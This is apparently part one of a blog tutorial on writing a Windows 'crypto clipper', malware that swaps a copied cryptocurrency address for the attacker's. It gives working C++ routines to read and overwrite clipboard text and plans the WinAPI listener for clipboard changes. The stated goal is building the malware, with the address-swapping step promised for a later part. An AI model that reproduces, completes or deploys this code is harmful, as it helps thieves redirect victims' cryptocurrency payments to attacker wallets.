## What is a Crypto Stealer ? 

Crypto stealer malware is a type of malicious software that is designed to steal cryptocurrencies from the victim's wallet or account. Once installed these malwares often operate by monitoring the device for cryptocurrency-related activity. When the victim attempts to access their wallet or account in anyway, the malware captures their login credentials and sends them to the attacker.

## In this post we will be focusing on Crypto Clippers which can be classfied under the Crypto Stealers family.

Crypto clipper malwares are a type of malicious software that targets cryptocurrencies. These malwares typically operate by replacing a user's cryptocurrency address with the attacker's own address when the user attempts to make a transaction. This allows the attacker to redirect the funds from the intended recipient to their own wallet.

Crypto clipper malwares often operate by injecting/monitoring the user's clipboard, which is used to store temporary data such as text or images that have been copied. When the user attempts to paste the address of the intended recipient into the cryptocurrency wallet software, the malware replaces the address with the attacker's own address before it is pasted.

This type of malware is interesting because it is simple yet capable of causing significant damage. In some cases, malware clippers only have the ability to monitor input and alter the clipboard, which looks harmless and unlikely to raise any alarms. 

In this post I will be going over basic design and implementation details of a simple clipper malware. We will be working on a windows environment with C++. We will also be utilizing some winapi functions, the heart of this malware is all about monitoring and changing clipboard data with the winapi.


## Design requirements

##### Windows offers various functions of interest that will make our jobs easier to build this. We will be using the following functions from the winapi

- OpenClipboard() to get access to the clipboard.
- IsClipboardFormatAvailable() to examin the content of the clipboard. Keep in mind that things like emojis and images can be copied so we dont want to get whatever data there is we are only interested in text data. 
- GetClipboardData() to get the actual text data.
- CloseClipboard() and GlobalLock() to free data and unlock resources.

##### Now, using the following functions we can actually start getting the data from the clipboard, but it's useless because we don't know when the user is using the clipboard. We would also need to run an infinite loop every second hoping we capture the crypto address we want. That's bad and would actaully never work in the real world so we need to find a better solution. Thankfully, windows has a [WM_CLIPBOARDUPDATE][1] message which is sent whenever the clipboard is updated. We will need to listen to those messages using the AddClipboardFormatListener() functions.

##### Those are all the functions we will be using from the winapi except for a few cleanup functions I didn't include in the list we will discuss them later in the Implementation section. 

#### The function we will need to implement ourselves are fairly simple.

- crypto_check(CONST CHAR* address, CONST CHAR* regex_pattern) a function to check the given data against a regex pattern for a crypto address.

This should be all for the basic barebone implementation of this malware. I won't be adding any anti-reversing/vm checks or evasion techniques, I will have write ups for those topics soon. For now I'm going to try and keep this one very short.

## Implementation


### Part 1 
##### First steps is to implement get_clip_data(HWND handle) function. The HWND(window handle) will be used later for now we can just set it to NULL whenever we call the function.

```Cpp
CONST CHAR* get_clip_data(HWND hd)
{

    DEBUG_PRINT("get_clip_data function running\n");

    if (!OpenClipboard(hd)) { // Access to clipboard

        DEBUG_PRINT("Error - Failed to open clipboard\n");
        return NULL;
    }

    if (!IsClipboardFormatAvailable(CF_TEXT)) // Checking for text format only
    {
        DEBUG_PRINT("Data in clipboard is not CF_TEXT");
        CloseClipboard();
        return NULL;
    }

    HANDLE MemBlock = GetClipboardData(CF_TEXT); // get data from the clipboard in text format
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - Get clipboard data failed \n");
        CloseClipboard();
        return NULL;
    }

    CHAR* Data = static_cast<char*>(GlobalLock(MemBlock)); // Casting Handle clipboard object to char* to access the data

    if (Data == NULL){
        DEBUG_PRINT("Error - Data is empty.... \n");
        CloseClipboard();
        return NULL;
    }
    //GlobalUnlock(MemBlock);
    CloseClipboard();
    return Data;
}
```

##### set_clip_data(CONST CHAR* data, HWND handle)

```Cpp

BOOL set_clip_data(CONST CHAR* data, HWND handle)
{

    DEBUG_PRINT("set clip data function funning.\n");

    if (!OpenClipboard(handle)) {
        DEBUG_PRINT("Error - opening clipboard failed.\n");
        return false;
    }

    if (!EmptyClipboard()) {
        DEBUG_PRINT("Error - empty clipboard function failed.\n");
        CloseClipboard();
        return false;
    }

    HGLOBAL MemBlock = GlobalAlloc(GMEM_MOVEABLE, (strlen(data) + 1));
    if (MemBlock == NULL) {
        DEBUG_PRINT("Error - GloableAlloc Failed\n");
        CloseClipboard();
        return false;
    }
    

    memcpy(GlobalLock(MemBlock), data, (strlen(data) + 1));
    GlobalUnlock(MemBlock);
       
    DEBUG_PRINT("set data to clipboard\n");
    if (SetClipboardData(CF_TEXT, MemBlock) == NULL) {
        CloseClipboard();
        return false;
    }

    CloseClipboard();
    return true;
}
```

##### What is this GlobalAllock/Lock/Unlock stuff ? To keep it simple windows has a Global memory "region" where programs can read and write and share resources to this location. What is an example of this ? clipboard! this is why we can copy and paste data between all different apps running on windows. More [GLobal Memory][2] 

#### Lets test what we have 

![clip](https://user-images.githubusercontent.com/120695832/210181201-33a9d785-66bb-4f4b-9a7e-e1417d0dd409.gif)

#### Seems like everything is working. In part two we will implement the message handler and crypto checker function. Which will allow us to monitor clipboard activity and implement the malicious part of this software. 



### Part 2
Coming soon....

[1]: https://learn.microsoft.com/en-us/windows/win32/dataxchg/wm-clipboardupdate "WM_CLIPBOARDUPDATE"
[2]: https://learn.microsoft.com/en-us/windows/win32/memory/memory-management-functions "GLobal Memory"
